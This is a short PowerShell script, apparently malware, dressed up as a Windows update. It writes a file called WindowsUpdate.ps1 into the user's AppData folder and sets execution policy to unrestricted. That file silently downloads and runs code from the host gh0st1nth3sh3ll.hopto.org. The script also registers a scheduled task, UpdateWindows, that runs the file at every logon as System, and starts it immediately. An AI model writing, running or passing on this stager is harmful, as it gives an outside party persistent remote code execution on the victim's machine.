echo "set-executionpolicy unrestricted -force`nSet-ExecutionPolicy RemoteSigned -force`npowershell.exe -nop -w hidden -c $('"') IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))$('"')"  > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1                           
set-executionpolicy unrestricted -force
Set-ExecutionPolicy RemoteSigned -force
schtasks.exe /create /ru "System" /sc ONLOGON /tn UpdateWindows /tr "powershell.exe -nop -w hidden -file C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1" /f
schtasks.exe /End /tn UpdateWindows
schtasks.exe /run /tn UpdateWindows
exit
